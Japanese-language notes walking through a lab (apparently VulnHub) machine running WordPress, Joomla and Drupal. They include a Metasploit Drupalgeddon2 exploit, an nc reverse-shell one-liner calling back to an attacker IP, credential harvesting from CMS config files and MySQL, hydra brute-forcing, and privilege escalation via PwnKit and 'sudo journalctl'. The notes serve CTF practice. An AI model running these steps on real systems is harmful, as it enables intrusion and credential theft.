### 論点
- cmsの設定ファイル
### keyword
- drupalの脆弱性、mysql,hydra,passwordを探す、rbash,sudo-l(journalctl)
### 課題
- ユーザでC2Cできるんでないか?
- 各cmsのtemplateにreverse-shellを書き込んでセッションを確立させる

## 攻略
- nmapするとcmsが3つあるのがわかる
  - 80 w3.css(cssフレームワーク)
  - 5000 wordpress
  - 8081 joomla
  - 9001 drupal
- サイトを順に見ていく
  - wordpressのサイトが崩れているので直すが、特に何もない。ただし適当にリンクを入れるとosコマンドインジェクションができるサイトがある。これはreverse-shellができる(追記に続きがある)
  - joomlaのサイトを見るが特に何もない。gobusterするといろいろサイトが出てくる
  - drupalのサイトを見るが特に何もない。
- droopescanでcmsをスキャンする
  - `droopescan scan wordpress -u $IP:5000`
  - `droopescan scan joomla -u $IP:8081`
  - `droopescan scan drupal -u $IP:9001`  

- drupalに対してはdrupal_geddon2をやってみる
```
search drupal
use 1
set rhosts
set lhost
set rport
```

- 対話型シェルにする
- システム内を探索する
- id
  - `www-data`しかない 
- `ps aux`を見ても何もない
- ls /home
  - userが3人
- cmsなので各cmsの設定ファイルを調べる。詳しくは下に書いてある。わからなければ、AIに聞く
- suid
  - pkexec,lxcくらい
- `find / -user www-data -type f 2>/dev/null`
  - /var/log/nginx/access.log,error.logがある
- `find / -iname "*pass*" -type f 2>/dev/null`

- suコマンドで切り替え
- suid
  - pkexecもgccもあるのでできそうだと思ったが、vi,vim,nanoがないので書き込みできない
  - PwnKitをParrotからダウンロードする
- sudo -l

```
sudo journalctl
!/bin/bash
```

## 追記
### reverse-shellをする
- `/home/user/tools/reverse-shell.txt`にある。次のを使うアドレスは書き換える
- `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.104 9001 >/tmp/f`
- Parrotで待受する`rlwrap nc -nlvp 9001`
- 次のをサイトに貼り付けてボタンを押す
- 対話型シェルにする

### 設定ファイルをチェックする
- ユーザ名をリストにする
- CMSに入ったらまずするのは、各設定ファイルをチェックする。ユーザ名とパスワードを取得
  - wordpress `/var/html/wordpress/public_html/wp-config.php`
  - drupal `/var/html/drupal/sites/defaults/settings.php`
  - joomla `/var/html/joomla/configuration.php`
- wordpress,drupalのmysqlは何もない
- joomlaのMySQLをチェックする
  - `show databases;`
  - `use joomla_db;`
  - `show tables;`
  - `select * from hs23w_users;` 
  - mailがパスワードになっているのでチェックする
- userとpasswordを使って、hydraをする
- sshでログインする
- rbashでコマンドが制限されている



### linpeas.shをuploadする
  - `bg`コマンドでParrotにシェルを戻す
  - `~/vulnhub/sickos`にlinpeas.shをコピーしてくる 
  - ここからはmsfconsoleに戻る
  - `sessions -i 1` 
  - `meterpreter > upload linpeas.sh /tmp`   
  - `chmod +x linpeas.sh`
  - `./linpeas.sh` 
  - `cat /var/www/html/drupal/misc/tyrell.pass`
    - このファイルは所有ユーザ、グループともにrootで他のはtyrellなので不自然 
  - (これでもいい)
    - `(Meterpreter) > search -d / -f *.pass`

